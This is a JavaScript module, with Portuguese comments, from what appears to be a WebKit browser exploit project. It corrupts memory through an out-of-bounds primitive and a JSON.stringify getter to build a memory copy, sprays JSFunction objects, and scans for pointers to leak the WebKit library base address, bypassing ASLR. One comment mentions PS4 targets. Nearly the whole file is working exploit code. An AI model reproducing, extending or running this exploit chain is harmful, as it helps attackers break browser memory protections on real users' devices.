// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment,
    getOOBAllocationSize // Importar para usar o tamanho configurado
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.36";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_36";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o QWORD lido será copiado

let getter_copy_called_flag_v10_36 = false;

// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
// ============================================================
async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag_v10_36 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        // Tentar configurar o ambiente OOB aqui se ele não existir pode ser problemático
        // se o tamanho de alocação mudar. É melhor garantir que ele seja configurado uma vez
        // pela função principal com o tamanho correto.
        logS3("ALERTA: Ambiente OOB não inicializado em readFromOOBOffsetViaCopy!", "error", FNAME_PRIMITIVE);
        return new AdvancedInt64(0xDEADDEAD, 0xBADBAD); // Retorna erro
    }
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Limpa destino

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_36 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();
                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
                } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
            } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
            return "getter_copy_v10_36_done";
        }
    };
    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);
    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
    if (!getter_copy_called_flag_v10_36) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PRINCIPAL (v10.36 - OOB_ALLOCATION_SIZE configurável)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakWebKitPointer_v10.36`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Vazar Ponteiro WebKit (ALLOCATION_SIZE configurável) ---`, "test", FNAME_CURRENT_TEST);

    let sprayedObjects = [];

    try {
        // Importante: triggerOOB_primitive() usa OOB_CONFIG.ALLOCATION_SIZE.
        // Altere OOB_CONFIG.ALLOCATION_SIZE no config.mjs para testar com buffers maiores.
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Usando oob_array_buffer_real com tamanho: ${oob_array_buffer_real.byteLength / 1024}KB`, "info", FNAME_CURRENT_TEST);


        // 1. Validar Primitiva de Cópia (mantido)
        const VALIDATION_OFFSET = Math.min(0x2A0, oob_array_buffer_real.byteLength - 8);
        const VALIDATION_QWORD = new AdvancedInt64(0x1A2B3C4D, 0x5E6F7A8B);
        if (VALIDATION_OFFSET < oob_array_buffer_real.byteLength - 8) {
            oob_write_absolute(VALIDATION_OFFSET, VALIDATION_QWORD, 8);
            let copied_validation = await readFromOOBOffsetViaCopy(VALIDATION_OFFSET);
            if (copied_validation && copied_validation.equals(VALIDATION_QWORD)) {
                logS3("  PASSO 1: Primitiva de cópia validada.", "good", FNAME_CURRENT_TEST);
            } else {
                logS3(`  PASSO 1: FALHA na validação da primitiva de cópia. Lido: ${copied_validation ? copied_validation.toString(true): "null"}.`, "critical", FNAME_CURRENT_TEST);
                // Não abortar, mas notar a falha.
            }
        } else {
            logS3("  PASSO 1: Validação da primitiva de cópia pulada (offset fora do buffer).", "warn", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(50);

        // 2. Pulverizar Objetos JSFunction (mantido)
        logS3("PASSO 2: Pulverizando objetos JSFunction...", "info", FNAME_CURRENT_TEST);
        const NUM_SPRAY_FUNCS = 500; // Aumentar spray
        for (let i = 0; i < NUM_SPRAY_FUNCS; i++) {
            sprayedObjects.push(function() { return 0xABCF0000 + i; });
        }
        logS3(`  ${sprayedObjects.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(600); // Pausa maior para heap assentar

        // 3. Escanear
        const SCAN_START = 0x080;
        // Ajustar SCAN_END para cobrir uma porção significativa do buffer OOB atual
        const SCAN_END = Math.min(oob_array_buffer_real.byteLength - 0x100, oob_array_buffer_real.byteLength - 0x20); // Deixar boa margem no final
        const SCAN_STEP = 0x08;

        logS3(`PASSO 3: Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} por Executable*...`, "info", FNAME_CURRENT_TEST);
        
        const functionOffsets = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS;
        if (!functionOffsets || Object.keys(functionOffsets).length === 0) {
            logS3("ERRO: WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS não definido ou vazio!", "critical", FNAME_CURRENT_TEST); return;
        }

        let webkitBaseLeaked = null;
        let potentialLeakCandidatesInfo = [];
        const executablePtrFieldOffset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;

        for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) {
            let offset_to_read_executable_ptr = cell_base_offset + executablePtrFieldOffset;
            if (offset_to_read_executable_ptr >= oob_array_buffer_real.byteLength - 8) continue;

            let potential_executable_ptr = await readFromOOBOffsetViaCopy(offset_to_read_executable_ptr);

            const isPtrZero = isAdvancedInt64Object(potential_executable_ptr) && potential_executable_ptr.low() === 0 && potential_executable_ptr.high() === 0;
            const isPtrBadRead = isAdvancedInt64Object(potential_executable_ptr) && potential_executable_ptr.low() === 0xBADBAD && potential_executable_ptr.high() === 0xDEADDEAD;
            const isPtrBadMagic = isAdvancedInt64Object(potential_executable_ptr) && potential_executable_ptr.low() === 0xBAD68BAD && potential_executable_ptr.high() === 0xBAD68BAD;

            if (potential_executable_ptr && !isPtrZero && !isPtrBadRead && !isPtrBadMagic ) {
                if (potential_executable_ptr.high() !== 0 && potential_executable_ptr.high() !== 0xFFFFFFFF ) {
                    potentialLeakCandidatesInfo.push({
                        read_from_oob_offset: offset_to_read_executable_ptr,
                        ptr_value: potential_executable_ptr,
                        origin_cell_base: cell_base_offset
                    });
                }
            }
            // Log de progresso menos frequente para scans longos
            if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 1024) === 0) { // A cada 8KB de scan
                logS3(`    Scan por Executable* em ${toHex(cell_base_offset)}... Candidatos: ${potentialLeakCandidatesInfo.length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(1); 
            }
        } // Fim do loop de scan

        logS3(`  Scan concluído. ${potentialLeakCandidatesInfo.length} ponteiros candidatos brutos (Executable*) encontrados. Analisando bases...`, "info", FNAME_CURRENT_TEST);

        for (const cand of potentialLeakCandidatesInfo) {
            const leaked_ptr = cand.ptr_value;
            for (const funcName in functionOffsets) {
                const funcOffsetStr = functionOffsets[funcName];
                if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
                try {
                    const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
                    const potential_base_addr = leaked_ptr.sub(funcOffsetAdv);
                    const isAligned = (potential_base_addr.low() & 0xFFF) === 0;
                    // Heurística para faixa de base: Ajuste conforme necessário para seu alvo
                    // (Ex: 0x10000000 a 0xE0000000 para PS4, mas pode ser muito diferente para Android/Blink)
                    const isHighPartPlausible = potential_base_addr.high() >= 0x1000 && potential_base_addr.high() < 0xF0000; 

                    if (isAligned && isHighPartPlausible) {
                        logS3(`    !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                        logS3(`      Ponteiro Executable* (lido de oob[${toHex(cand.read_from_oob_offset)}]): ${leaked_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                        logS3(`      Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
                        logS3(`      Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
                        document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
                        webkitBaseLeaked = potential_base_addr;
                        break; 
                    } else if (isAligned) { // Logar bases alinhadas mesmo que fora da faixa "plausível"
                        logS3(`    [INFO] Base Alinhada: Ptr=${leaked_ptr.toString(true)} - ${funcName} (${funcOffsetAdv.toString(true)}) -> Base=${potential_base_addr.toString(true)} (Faixa High: ${toHex(potential_base_addr.high())})`, "info", FNAME_CURRENT_TEST);
                    }
                } catch (e_adv64) { /* Ignora */ }
            }
            if (webkitBaseLeaked) break;
        }

        if (webkitBaseLeaked) {
            logS3("VAZAMENTO DE ENDEREÇO BASE DO WEBKIT PARECE BEM-SUCEDIDO!", "good", FNAME_CURRENT_TEST);
        } else {
            logS3("Não foi possível vazar o endereço base do WebKit automaticamente nesta execução.", "warn", FNAME_CURRENT_TEST);
            if (potentialLeakCandidatesInfo.length > 0) {
                logS3(`  ${potentialLeakCandidatesInfo.length} QWORDs candidatos a ponteiro foram analisados. Revise os logs "Base Alinhada" para encontrar manualmente.`, "info", FNAME_CURRENT_TEST);
            } else {
                logS3("  Nenhum QWORD candidato a Executable* passou na heurística inicial.", "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
